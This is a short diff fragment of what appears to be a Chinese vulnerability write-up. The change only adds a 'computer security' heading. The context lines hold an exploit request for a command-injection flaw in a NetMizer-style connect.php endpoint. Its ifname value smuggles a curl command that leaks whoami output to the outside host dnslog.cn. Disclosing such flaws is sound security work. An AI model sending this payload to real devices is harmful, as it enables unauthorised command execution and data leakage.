@@ -65,6 +65,8 @@ if($action == "start"){
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
+计算机安全
+
 ```
 GET /data/manage/connect.php?action=start&device=192.168.1.1&ifname=;curl+`whoami`.dnslog.cn+%23+&name=test&port=88 HTTP/1.1
 Host: netmizer.mrxn.net
